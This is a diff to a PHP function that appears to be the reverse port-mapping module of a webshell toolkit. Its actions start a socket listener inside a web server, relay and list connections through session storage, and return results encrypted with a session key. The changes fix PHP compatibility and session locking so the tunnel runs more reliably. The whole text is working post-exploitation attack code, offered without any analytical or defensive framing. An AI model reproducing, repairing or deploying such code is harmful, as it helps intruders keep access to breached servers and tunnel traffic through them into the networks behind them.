@@ -34,7 +34,8 @@ function main($action, $listenPort = "", $socketHash = "", $extraData = "MTIz")
             $_SESSION["running".$listenPort] = true;
             session_write_close();
 
-            ob_end_clean();
+
+            /*ob_end_clean();
             header("Connection: close");
             ignore_user_abort();
             ob_start();
@@ -44,11 +45,12 @@ function main($action, $listenPort = "", $socketHash = "", $extraData = "MTIz")
             $size = ob_get_length();
             header("Content-Length: $size");
             ob_end_flush();
-            flush();
+            flush();*/
 
-            $clients = [];
-            $write = [];
-            $exp = [];
+            $clients = array();
+            $read=array();
+            $write = array();
+            $exp = array();
             while ($_SESSION["running".$listenPort]) {
 
                 $serverInnerSocket = socket_accept($serverSocket);
@@ -58,11 +60,14 @@ function main($action, $listenPort = "", $socketHash = "", $extraData = "MTIz")
                      @session_start();
                                             $_SESSION[$serverInnersocketHash]="socket";
                                             session_write_close();
+
                     socket_set_nonblock($serverInnerSocket);
                     $clients[] = $serverInnerSocket;
                 }
                 $read = $clients;
+
                 $write = $clients;
+
                 if (socket_select($read, $write, $exp, null) > 0) {
                     foreach ($read as $socket_item) {
                         socket_getpeername($socket_item, $address, $port);
@@ -97,6 +102,7 @@ function main($action, $listenPort = "", $socketHash = "", $extraData = "MTIz")
             break;
         case "list":
             $socketList = array();
+             @session_start();
             foreach ($_SESSION as $key => $val) {
                 if (strstr($key, "reverseportmap")) {
                     if ($_SESSION[$key]!="socket")
@@ -109,15 +115,16 @@ function main($action, $listenPort = "", $socketHash = "", $extraData = "MTIz")
                     array_push($socketList, $socketObj);
                 }
             }
+             session_write_close();
             $result["status"] = base64_encode("success");
             $result["msg"] = base64_encode(json_encode($socketList));
             echo encrypt(json_encode($result), $_SESSION['k']);
             return;
         case "read":
             $socketReadHash=$socketHash."_read";
+            @session_start();
             if (isset($_SESSION[$socketReadHash])) {
                 $readContent=$_SESSION[$socketReadHash];
-                @session_start();
                 $_SESSION[$socketReadHash]="";
                 session_write_close();
                 echo $readContent;
@@ -139,18 +146,22 @@ function main($action, $listenPort = "", $socketHash = "", $extraData = "MTIz")
             }
             return;
         case "stop":
-            $socketHashList = [];
+            $socketHashList = array();
+            @session_start();
             foreach ($_SESSION as $key => $val) {
                 if (strstr($key, "reverseportmap_socket_" . $listenPort)) {
                     $socketHashList[] = $key;
                 }
             }
+            session_write_close();
             foreach ($socketHashList as $key) {
+                @session_start();
                 unset($_SESSION[$key]);
+                session_write_close();
             }
             $serverSocketHash = "reverseportmap_server_" . $listenPort;
+            @session_start();
             unset($_SESSION[$serverSocketHash]);
-             @session_start();
              $_SESSION["running".$listenPort] = false;
              session_write_close();
             $result["status"] = base64_encode("success");
